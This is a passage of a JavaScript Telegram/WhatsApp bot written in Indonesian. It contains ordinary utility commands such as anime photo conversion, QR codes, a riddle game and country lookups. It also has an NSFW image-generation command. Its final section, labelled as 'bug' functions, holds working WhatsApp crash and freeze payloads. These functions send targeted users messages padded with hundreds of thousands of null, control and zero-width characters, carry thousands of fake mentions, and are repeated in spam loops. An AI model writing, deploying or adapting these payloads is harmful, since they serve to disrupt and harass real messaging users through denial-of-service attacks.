      const fileId = reply.photo[reply.photo.length - 1].file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      const tempFilePath = `./temp_${Date.now()}.jpg`;

      // Unduh gambar dari Telegram
      const photo = await axios.get(fileLink.href, { responseType: "arraybuffer" });
      fs.writeFileSync(tempFilePath, photo.data);

      // Upload gambar ke hosting publik (qu.ax)
      const form = new FormData();
      form.append("files[]", fs.createReadStream(tempFilePath));
      const uploadRes = await axios.post("https://qu.ax/upload.php", form, {
        headers: form.getHeaders(),
      });

      if (!uploadRes.data.success || !uploadRes.data.files?.length) {
        fs.unlinkSync(tempFilePath);
        return ctx.reply("❌ Gagal upload gambar ke server.");
      }

      const imageUrl = uploadRes.data.files[0].url;

      // Kirim request ke PixNova API
      const payload = {
        session_hash: Math.random().toString(36).substring(2, 10),
        data: {
          source_image: imageUrl,
          strength: 0.6,
          prompt: "(masterpiece), best quality",
          negative_prompt:
            "(worst quality, low quality:1.4), (greyscale, monochrome:1.1), cropped, lowres , username, blurry, trademark, watermark, title, multiple view, Reference sheet, curvy, plump, fat, strabismus, clothing cutout, side slit,worst hand, (ugly face:1.2), extra leg, extra arm, bad foot, text, name",
          request_from: 2,
        },
      };

      const animeRes = await axios.post("https://pixnova.ai/api/photo2anime", payload, {
        headers: { "Content-Type": "application/json" },
      });

      fs.unlinkSync(tempFilePath); // Hapus file lokal sementara

      const resultUrl = animeRes.data?.output?.result?.[0];
      if (!resultUrl) {
        return ctx.reply("❌ Gagal mendapatkan hasil dari PixNova.");
      }

      await ctx.replyWithPhoto(
        { url: `https://oss-global.pixnova.ai/${resultUrl}` },
        { caption: "_✅ Gambar berhasil diubah menjadi anime!_" }
      );
    } catch (err) {
      console.error("[toanime] Error:", err);
      ctx.reply("⚠️ Terjadi kesalahan saat memproses gambar.");
    }
  });

bot.command('cqr', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');

    if (!text) return ctx.reply('Example: /cqr Senn Is Here');

    const url = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(text)}`;

    await ctx.replyWithPhoto(url, {
        caption: '✅ QR Code berhasil dibuat'
    });
});

const tekaTeki = {};

const soalList = [
  { soal: "Apa yang punya kunci banyak tapi gak bisa buka pintu?", jawaban: "piano", hint: "alat musik" },
  { soal: "Semakin diisi malah makin ringan?", jawaban: "balon", hint: "ulang tahun" },
  { soal: "Apa yang selalu naik tapi gak pernah turun?", jawaban: "umur", hint: "semua orang punya" },
  { soal: "Apa yang kalau dipotong malah jadi panjang?", jawaban: "jalan", hint: "di luar rumah" },
  { soal: "Hewan apa yang suka nyanyi?", jawaban: "burung", hint: "bisa terbang" },

  { soal: "Apa yang punya sayap tapi gak bisa terbang?", jawaban: "kipas", hint: "buat angin" },
  { soal: "Apa yang bisa lari tapi gak punya kaki?", jawaban: "air", hint: "mengalir" },
  { soal: "Apa yang kalau pecah malah jadi banyak?", jawaban: "rekor", hint: "prestasi" },
  { soal: "Apa yang selalu ada di depan tapi gak terlihat?", jawaban: "masa depan", hint: "waktu" },
  { soal: "Apa yang kalau ditambah malah berkurang?", jawaban: "umur", hint: "hidup" },

  { soal: "Apa yang makin lama makin pendek?", jawaban: "lilin", hint: "dibakar" },
  { soal: "Apa yang gak pernah lapar?", jawaban: "api", hint: "makan terus" },
  { soal: "Apa yang punya mata tapi gak bisa lihat?", jawaban: "jarum", hint: "jahit" },
  { soal: "Apa yang bisa ngomong tapi gak punya mulut?", jawaban: "radio", hint: "bunyi" },
  { soal: "Apa yang selalu basah walau gak kena air?", jawaban: "lidah", hint: "mulut" },

  { soal: "Apa yang bisa naik turun tapi gak bergerak?", jawaban: "tangga", hint: "rumah" },
  { soal: "Apa yang punya leher tapi gak punya kepala?", jawaban: "botol", hint: "minuman" },
  { soal: "Apa yang kalau dibuang malah dicari?", jawaban: "nyawa", hint: "hidup" },
  { soal: "Apa yang punya gigi tapi gak bisa makan?", jawaban: "sisir", hint: "rambut" },
  { soal: "Apa yang bisa pecah tanpa disentuh?", jawaban: "janji", hint: "kata" },

  { soal: "Apa yang selalu mengikuti tapi gak bisa disentuh?", jawaban: "bayangan", hint: "matahari" },
  { soal: "Apa yang punya kaki tapi gak bisa jalan?", jawaban: "meja", hint: "furniture" },
  { soal: "Apa yang bisa terbang tanpa sayap?", jawaban: "waktu", hint: "gak terasa" },
  { soal: "Apa yang punya mulut tapi gak bisa makan?", jawaban: "sungai", hint: "air" },
  { soal: "Apa yang makin banyak diambil malah makin besar?", jawaban: "lubang", hint: "tanah" },

  { soal: "Apa yang bisa jalan tanpa kaki dan menangis tanpa mata?", jawaban: "awan", hint: "langit" },
  { soal: "Apa yang punya telinga tapi gak bisa dengar?", jawaban: "panci", hint: "dapur" },
  { soal: "Apa yang kalau dilihat gak enak tapi kalau dimakan enak?", jawaban: "obat", hint: "sakit" },
  { soal: "Apa yang bisa bikin dingin tapi gak punya es?", jawaban: "kipas", hint: "angin" },
  { soal: "Apa yang selalu telat tapi gak pernah dimarahin?", jawaban: "bayangan", hint: "ikut kita" },

  { soal: "Apa yang bisa dibuka tapi gak bisa ditutup?", jawaban: "umur", hint: "hidup" },
  { soal: "Apa yang punya tangan tapi gak bisa pegang?", jawaban: "jam", hint: "waktu" },
  { soal: "Apa yang selalu ada tapi gak pernah kelihatan?", jawaban: "udara", hint: "napas" },
  { soal: "Apa yang bisa dilihat tapi gak bisa disentuh?", jawaban: "mimpi", hint: "tidur" },
  { soal: "Apa yang bisa bikin kenyang tapi gak bisa dimakan?", jawaban: "janji", hint: "kata" },

  { soal: "Apa yang kalau hilang dicari, kalau ada dilupain?", jawaban: "uang", hint: "dompet" },
  { soal: "Apa yang bisa berdiri tanpa kaki?", jawaban: "botol", hint: "minuman" },
  { soal: "Apa yang punya kulit tapi bukan manusia?", jawaban: "buah", hint: "makan" },
  { soal: "Apa yang bisa bergerak tanpa disentuh?", jawaban: "jam", hint: "detik" },
  { soal: "Apa yang selalu berubah tapi tetap sama?", jawaban: "waktu", hint: "jalan terus" },

  { soal: "Apa yang punya banyak lubang tapi tetap bisa menampung air?", jawaban: "spons", hint: "cuci" },
  { soal: "Apa yang bisa kamu tangkap tapi gak bisa dilempar?", jawaban: "flu", hint: "penyakit" },
  { soal: "Apa yang makin cepat makin gak kelihatan?", jawaban: "angin", hint: "udara" },
  { soal: "Apa yang bisa mati tapi gak pernah hidup?", jawaban: "baterai", hint: "hp" },
  { soal: "Apa yang punya sisi tapi gak punya bentuk?", jawaban: "koin", hint: "uang" }
];

bot.command("tekateki", async (ctx) => {
  const id = ctx.chat.id;

  if (tekaTeki[id]) {
    return ctx.reply("⚠️ Sabar, masih ada soal yang belum kejawab 😅");
  }

  const data = soalList[Math.floor(Math.random() * soalList.length)];

  tekaTeki[id] = {
    jawaban: data.jawaban,
    timeout: null,
    hintTimeout: null
  };

  ctx.reply(`🧩 Tebak cepat!\n\n"${data.soal}"\n\nSiapa cepat dia dapat 😈\nWaktu: 30 detik`);

  // hint
  tekaTeki[id].hintTimeout = setTimeout(() => {
    if (tekaTeki[id]) {
      ctx.reply(`💡 Hint: ${data.hint}`);
    }
  }, 10000);

  // timer
  tekaTeki[id].timeout = setTimeout(() => {
    if (tekaTeki[id]) {
      ctx.reply(`⏰ Waktu habis!\nJawaban: ${tekaTeki[id].jawaban}`);
      delete tekaTeki[id];
    }
  }, 30000);
});

// rebutan jawaban
bot.on("text", async (ctx) => {
  const id = ctx.chat.id;
  if (!tekaTeki[id]) return;

  const jawabanUser = ctx.message.text.toLowerCase().trim();
  const benar = tekaTeki[id].jawaban;

  if (jawabanUser === benar) {
    clearTimeout(tekaTeki[id].timeout);
    clearTimeout(tekaTeki[id].hintTimeout);

    const menang = [
      `🔥 ${ctx.from.first_name} dapet!`,
      `🎉 ${ctx.from.first_name} paling cepat!`,
      `😳 Buset ${ctx.from.first_name} langsung bener`
    ];

    ctx.reply(menang[Math.floor(Math.random() * menang.length)]);
    delete tekaTeki[id];
  }
});


  bot.command('countryinfo', async (ctx) => {
    try {
      const input = ctx.message.text.split(' ').slice(1).join(' ');
      if (!input) {
        return ctx.reply('Masukkan nama negara setelah perintah.\n\nContoh:\n`/countryinfo Indonesia`', { parse_mode: 'Markdown' });
      }

      const res = await axios.post('https://api.siputzx.my.id/api/tools/countryInfo', {
        name: input
      });

      const { data } = res.data;

      if (!data) {
        return ctx.reply('Negara tidak ditemukan atau tidak valid.');
      }

      const caption = `
🌍 *${data.name}* (${res.data.searchMetadata.originalQuery})
📍 *Capital:* ${data.capital}
📞 *Phone Code:* ${data.phoneCode}
🌐 *Continent:* ${data.continent.name} ${data.continent.emoji}
🗺️ [Google Maps](${data.googleMapsLink})
📏 *Area:* ${data.area.squareKilometers} km²
🏳️ *TLD:* ${data.internetTLD}
💰 *Currency:* ${data.currency}
🗣️ *Languages:* ${data.languages.native.join(', ')}
🧭 *Driving Side:* ${data.drivingSide}
⚖️ *Government:* ${data.constitutionalForm}
🍺 *Alcohol Prohibition:* ${data.alcoholProhibition}
🌟 *Famous For:* ${data.famousFor}
      `.trim();

      await ctx.replyWithPhoto(
        { url: data.flag },
        {
          caption,
          parse_mode: 'Markdown',
        }
      );

     
      if (data.neighbors && data.neighbors.length) {
        const neighborText = data.neighbors.map(n => `🧭 *${n.name}*\n📍 [Maps](https://www.google.com/maps/place/${n.coordinates.latitude},${n.coordinates.longitude})`).join('\n\n');
        await ctx.reply(`🌐 *Negara Tetangga:*\n\n${neighborText}`, { parse_mode: 'Markdown' });
      }

    } catch (err) {
      console.error(err);
      ctx.reply('Gagal mengambil informasi negara. Coba lagi nanti atau pastikan nama negara valid.');
    }
  });
  
bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❗ Reply ke media (foto/video/audio/doc/sticker) lalu kirim /tourl");
  try {
    const pick = r.photo?.slice(-1)[0]?.file_id || r.video?.file_id || r.document?.file_id || r.audio?.file_id || r.voice?.file_id || r.sticker?.file_id;
    if (!pick) return ctx.reply("❌ Tidak menemukan media valid.");
    const link = await ctx.telegram.getFileLink(pick);
    ctx.reply(`🔗 ${link}`);
  } catch { ctx.reply("❌ Gagal membuat URL media."); }
});


bot.command("nsfwimg", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    const prompt = args.join(" ");
    if (!prompt) {
      return ctx.reply("⚠️ Mohon sertakan prompt. Contoh:\n/nsfwimg furry antro nude on the beach");
    }

    const API_URL = "https://fastrestapis.fasturl.cloud/aiimage/nsfw";

    try {
      const response = await axios.get(API_URL, {
        params: { prompt },
        responseType: "arraybuffer",
        headers: { "accept": "image/png" },
        validateStatus: () => true,
      });

      switch (response.status) {
        case 200:
          return ctx.replyWithPhoto(
            { source: Buffer.from(response.data) },
            { caption: `Prompt: ${prompt}` }
          );

        case 400:
          return ctx.reply("❌ Bad Request: Prompt tidak ditemukan atau invalid.");

        case 403:
          return ctx.reply("🚫 Forbidden: Akses ditolak.");

        case 404:
          return ctx.reply("🔍 Not Found: Tidak ada gambar untuk prompt tersebut.");

        case 429:
          return ctx.reply("⏳ Too Many Requests: Terlalu banyak permintaan, coba lagi nanti.");

        case 500:
          return ctx.reply("💥 Internal Server Error: Terjadi kesalahan server.");

        default:
          return ctx.reply(`⚠️ Error ${response.status}: ${response.statusText}`);
      }
    } catch (error) {
      console.error(error);
      return ctx.reply("❌ Gagal menghubungi API, coba lagi nanti.");
    }
  });
  
bot.command("ceknegara", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknegara id");

  try {
    const res = await axios.get(`https://restcountries.com/v3.1/alpha/${args}`);
    const c = res.data[0];

    let msg = `🏴 *Info Negara:*\n\n` +
              `• Nama: ${c.name.common}\n` +
              `• Ibu Kota: ${c.capital ? c.capital[0] : "-"}\n` +
              `• Populasi: ${c.population.toLocaleString()}\n` +
              `• Mata Uang: ${Object.values(c.currencies)[0].name} (${Object.keys(c.currencies)[0]})\n` +
              `• Bahasa: ${Object.values(c.languages).join(", ")}\n` +
              `• Timezone: ${c.timezones.join(", ")}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Kode negara tidak valid!");
  }
});

// bot.js

bot.command("ceknum", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknum +6281234567890");

  try {
    const res = await axios.get(`https://api.apilayer.com/number_verification/validate?number=${args}`, {
      headers: { apikey: config.apilayerKey }
    });

    if (!res.data.valid) return ctx.reply("❌ Nomor tidak valid!");

    const msg = `📱 *Info Nomor:*\n\n` +
                `• Nomor: ${res.data.international_format}\n` +
                `• Negara: ${res.data.country_name} (${res.data.country_code})\n` +
                `• Operator: ${res.data.carrier}\n` +
                `• Tipe: ${res.data.line_type}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek nomor (pastikan APIKEY Api sudah benar)");
  }
});
////////// OWNER MENU \\\\\\\\\
bot.command("status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const wastatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ status WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ status : ${wastatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0]) {
      return ctx.reply(
        "Example:\n/blockcmd /crashui"
      );
    }

    let cmd = args[0].toLowerCase();

    // hapus @botusername
    if (cmd.includes("@")) {
      cmd = cmd.split("@")[0];
    }

    const db = loadDB();

    // pakai USER ID
    const userId = String(ctx.from.id);

    // init db
    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[userId])
      db.groupCmdBlock[userId] = [];

    // normalize
    const blocked =
      db.groupCmdBlock[userId]
      .map(c =>
        c.toLowerCase().split("@")[0]
      );

    // cek sudah ada
    if (blocked.includes(cmd)) {
      return ctx.reply(
        "⚠️ Command sudah diblock."
      );
    }

    // save
    db.groupCmdBlock[userId].push(cmd);

    saveDB(db);

    ctx.reply(
      `✅ Berhasil block ${cmd}`
    );

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0]) {
      return ctx.reply(
        "Example:\n/unblockcmd /crashui"
      );
    }

    let cmd = args[0].toLowerCase();

    if (cmd.includes("@")) {
      cmd = cmd.split("@")[0];
    }

    const db = loadDB();

    const userId = String(ctx.from.id);

    if (!db.groupCmdBlock?.[userId]) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    db.groupCmdBlock[userId] =
      db.groupCmdBlock[userId]
      .filter(c =>
        c.toLowerCase().split("@")[0] !== cmd
      );

    saveDB(db);

    ctx.reply(
      `✅ Berhasil unblock ${cmd}`
    );

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
///////////////////[FUNCTION BUG DI BWH INI]///////////////
//delay
async function Conghard(sock, target) {
  const Cong = {
    interactiveResponseMessage: {
      body: {
        text: "SV BANG CONG PROBE",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: '{"values":{"in_pin_code":"999999","building_name":"","landmark_area":"18","address":"Amp4","tower_number":"","city":"","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X' + "\u0000".repeat(900000) + '"}}',
        version: 3
      }
    }
  };

  await sock.relayMessage(target, Cong, {});
}

async function DelayVisible(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "𓆩ꕤJembut delay ya omꕤ𓆪",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function DelayFreezeChatInvis(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "ATX EXOSED"
      },
      nativeFlowMessage: {
        buttons: "\u001A".repeat(500000)
      }
    }
  }, { participant: { jid: target } });
  const atxx = "𑇂𑆵𑆴𑆿".repeat(50000);
  const overfllws = "{".repeat(500000);
  for(let z = 0; z < 45; z++) {
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
              forwardingScore: 999999999,
              isForwarded: true,
              stanzaId: target,
              participant: target
            }, 
            body: {
              text: "ATX EXPOSED" + atxx,
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{"flow_cta":"${atxx}"}` + overfllws,
              version: 3
            }
          }
        }
      }
    }, {});
  
    await sock.relayMessage(target, msg.message, rtr ? { 
      messageId: msg.key.id, 
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: { status_setting: "all" },
        content: [{ tag: "mentioned_users", content: [{ tag: "to", attrs: { jid: target } }] }]
      }]
    } : { messageId: msg.key.id });
    
    await new Promise(r => setTimeout(r, 80));
  }
  
  console.log(`Sent To ${target}`);
}

async function DelayExelion(sock, target) {
 const msg1 = {
      interactiveResponseMessage: {
        body: {
          text: "Exelion Om",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: '{"values":{"in_pin_code":"999999","building_name":"","landmark_area":"18","address":"Amp4","tower_number":"","city":"","name":"Amp4","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X' + "\u0000".repeat(900000) + '"}}',
          version: 3
        }
      }
    };
     await sock.relayMessage(target, msg1, {
      participant: { jid: target },
    });
   }
   
async function AtxSpamDelay(sock, target) {
    let atx = "\u0000".repeat(65000);
    let zyu = "\u200B".repeat(50000);
    let c = "\u200C".repeat(50000);
    let d = atx + zyu + c;
    let e = [];
    
    for (let i = 0; i < 150; i++) {
        e.push({
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
                display_text: d,
                id: d
            })
        });
        e.push({
            name: "send_location"
        });
        e.push({
            name: "single_select",
            buttonParamsJson: JSON.stringify({ title: d })
        });
    }
    
    let f = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: d },
                    footer: { text: "\u200B".repeat(30000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            bottom_sheet: {
                                list_title: d,
                                button_title: d,
                                divider_indices: Array.from({ length: 1000 }, (_, i) => i)
                            },
                            limited_time_offer: {
                                text: "\u200C".repeat(20000),
                                copy_code: "\u0000".repeat(20000),
                                expiration_time: Date.now() * 999
                            }
                        }),
                        buttons: e
                    }
                }
            }
        }
    };
    
    for (let i = 0; i < 75; i++) {
        await sock.relayMessage(target, f, {});
        console.log(`[ATX] Send To ${target}`);
        await new Promise(r => setTimeout(r, 5));
    }
    console.log(`[ATX] Selesai spam ke ${target} - ${75} pesan terkirim`);
}

// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();